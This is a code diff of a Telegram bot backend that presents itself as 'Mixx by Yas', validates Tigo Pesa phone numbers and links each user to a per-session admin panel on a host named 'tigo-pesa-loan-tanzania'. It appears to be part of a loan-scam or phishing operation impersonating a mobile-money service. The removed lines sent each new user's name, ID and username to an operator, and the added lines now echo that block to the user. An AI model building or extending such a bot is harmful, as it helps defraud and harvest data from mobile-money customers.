@@ -1,9 +1,7 @@
 /**
  * **MIXX BY YAS - BACKEND SERVER (MULTI-ADMIN SUPPORT & SAFE WEBHOOK/POLLING)**
  * 
- * Includes:
- * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
- * - Instant Telegram user info forwarding with custom Render admin URL tracking.
+ * Updated: Sends user their own details and unique session link directly upon /start.
  */
 
 const express = require('express');
@@ -39,7 +37,6 @@ function isValidTigoNumber(phoneStr) {
   return tigoRegex.test(cleaned);
 }
 
-// Helper to call Telegram HTTP endpoints
 async function telegramApi(pathSuffix, options = {}) {
   const url = `${TELEGRAM_API_BASE}/${pathSuffix}`;
   const res = await fetch(url, options);
@@ -107,7 +104,7 @@ async function initBot() {
 
   /**
    * **INSTANT /START COMMAND HANDLER**
-   * Welcomes the user and sends formatted details to the admin with the Render link.
+   * Sends the requested personal info block directly back to the user on their phone.
    */
   bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
@@ -121,27 +118,18 @@ async function initBot() {
     // Custom Render Admin link ending with Admin-1 and appending the user's chat ID
     const customAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/Admin-1?chatId=${user.id}`;
 
-    // 1. Send welcome message back to the user
-    const welcomeText = 
-      `Hello **${fullName}**! 👋\n\n` +
-      `Welcome to Mixx by Yas. Your profile has been registered with our team.`;
+    // Message sent directly to the user's phone chat window
+    const userWelcomeInfo = 
+      `🚨 **New User Started the Bot!**\n\n` +
+      `👤 **Name:** ${fullName}\n` +
+      `🆔 **Chat ID:** \`${user.id}\`\n` +
+      `🏷 **Username:** ${username}\n` +
+      `🔗 **Admin Panel Link:** [Open Session](${customAdminLink})`;
 
-    await bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' }).catch(() => {});
-
-    // 2. Dispatch metadata immediately to the Admin using your custom format
-    if (DEFAULT_CHAT_ID && String(chatId) !== String(DEFAULT_CHAT_ID)) {
-      const adminAlert = 
-        `🚨 **New User Started the Bot!**\n\n` +
-        `👤 **Name:** ${fullName}\n` +
-        `🆔 **Chat ID:** \`${user.id}\`\n` +
-        `🏷 **Username:** ${username}\n` +
-        `🔗 **Admin Panel Link:** [Open Session](${customAdminLink})`;
-
-      await bot.sendMessage(DEFAULT_CHAT_ID, adminAlert, { 
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true 
-      }).catch(err => console.error('[Bot] Failed to alert admin on start:', err.message));
-    }
+    await bot.sendMessage(chatId, userWelcomeInfo, { 
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true 
+    }).catch(err => console.error('[Bot] Failed to send info to user:', err.message));
   });
 
   // Attach callback_query handler
